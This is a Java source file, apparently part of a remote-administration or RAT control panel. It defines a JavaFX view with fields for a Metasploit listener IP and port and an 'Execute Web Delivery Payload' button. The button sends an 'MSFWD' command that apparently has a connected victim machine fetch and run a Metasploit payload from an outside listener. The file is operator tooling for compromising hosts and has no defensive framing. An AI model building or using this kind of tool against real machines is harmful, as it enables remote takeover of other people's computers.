package GUI.Views;

import GUI.Components.BottomBar;
import GUI.Components.TopBar;
import GUI.Styler;
import Server.ClientObject;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Pos;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyCodeCombination;
import javafx.scene.layout.Priority;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

import java.io.IOException;

public class WebDeliveryView {

    private static TextField serverIpField;
    private static TextField portField;
    private static Button sendCommandButton;

    public static TextField getServerIpField() {
        return serverIpField;
    }
    public static TextField getPortField(){
        return portField;
    }
    public static Button getsendCommandButton() {
        return sendCommandButton;
    }


    public VBox getWebDeliveryView(Stage stage, ClientObject clientObject) {
        VBox vBox = new VBox();
        VBox.setVgrow(vBox, Priority.ALWAYS);
        vBox.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
        VBox vBox2 = new VBox(5);
        vBox2.setId("webdeliveryView");
        vBox2.setAlignment(Pos.CENTER);
        vBox2.setMinWidth(150);
        VBox.setVgrow(vBox2, Priority.ALWAYS);

        sendCommandButton = new Button("Execute Web Delivery Payload");

        sendCommandButton.setOnAction(event -> {

            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("MSFWD " + getServerIpField().getText() + " " + Integer.parseInt(getPortField().getText()));
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            } else {
                sendCommandButton.setText("Unable to complete. Client offline.");
            }
        });

        /*sendCommandButton.getScene().getAccelerators().put(
            new KeyCodeCombination(KeyCode.ENTER),
            () -> sendCommandButton.fire()
        );*/

        serverIpField = new TextField("MSF Listener IP");
        portField = new TextField("MSF Listener port");

        serverIpField.setMaxWidth(150);

        // Add elements to view
        vBox2.getChildren().addAll(serverIpField, portField, sendCommandButton);
        vBox.getChildren().addAll(new TopBar().getTopBarSansOptions(stage), vBox2, new BottomBar().getBottomBar());
        return vBox;
    }
}
